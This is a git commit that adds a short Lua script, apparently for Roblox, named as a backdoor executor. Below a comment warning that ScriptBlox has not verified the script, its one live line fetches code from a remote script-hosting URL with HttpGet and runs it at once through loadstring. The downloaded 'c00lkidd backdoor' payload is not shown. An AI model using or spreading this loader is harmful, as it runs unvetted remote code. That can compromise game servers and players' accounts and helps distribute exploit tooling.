c7e204649f9b670d1d043fa14e6c5ae2da464741
gruppjakob5-jpg <gruppjakob5@gmail.com>
2026-05-01 12:40:10 +0200

    Add warning and loadstring for backdoor script
    Added a warning comment about script verification and included a loadstring call.

---
+++ c00kidd.backdoor.executor.ss.lua
@@ -0,0 +1,4 @@
+--[[
+	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
+]]
+loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-C00lkidd-Backdoor-54379"))()
